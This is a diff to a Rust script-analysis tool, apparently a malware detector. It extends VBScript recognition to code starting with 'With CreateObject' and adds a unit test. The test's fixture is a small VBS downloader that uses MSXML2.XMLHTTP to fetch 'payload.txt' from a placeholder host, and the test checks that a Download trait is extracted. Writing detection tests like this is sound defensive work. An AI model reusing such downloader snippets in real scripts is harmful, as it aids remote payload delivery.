@@ -2965,6 +2965,7 @@ fn starts_like_standalone_vbs(lower: &str) -> bool {
     first.starts_with("dim ")
         || (first.starts_with("const ") && !looks_like_js_script(lower))
         || (first.starts_with("set ") && first.contains("createobject"))
+        || (first.starts_with("with ") && first.contains("createobject"))
         || first.starts_with("option explicit")
         || first.starts_with("private function")
         || first.starts_with("on error ")
@@ -14391,6 +14392,33 @@ http.Send"#;
             report.deobfuscated.contains(
                 "Const u = \"https://standalone-vbs-const.example/payload.txt\"\nSet http"
             ),
+            "standalone VBS source was not preserved in deobfuscated output: {:?}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn standalone_vbs_with_createobject_prefix_xmlhttp_url_extracted() {
+        let vbs = br#"With CreateObject("MSXML2.XMLHTTP")
+.Open "GET", "https://standalone-vbs-with.example/payload.txt", False
+.Send
+End With"#;
+        let report = analyze(vbs, &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. }
+                    if src == "https://standalone-vbs-with.example/payload.txt"
+            )
+        });
+        assert!(
+            has,
+            "no Download trait from standalone VBS with With/CreateObject prefix: {:?}",
+            report.traits
+        );
+        assert!(
+            report
+                .deobfuscated
+                .contains("With CreateObject(\"MSXML2.XMLHTTP\")\n.Open"),
             "standalone VBS source was not preserved in deobfuscated output: {:?}",
             report.deobfuscated
         );
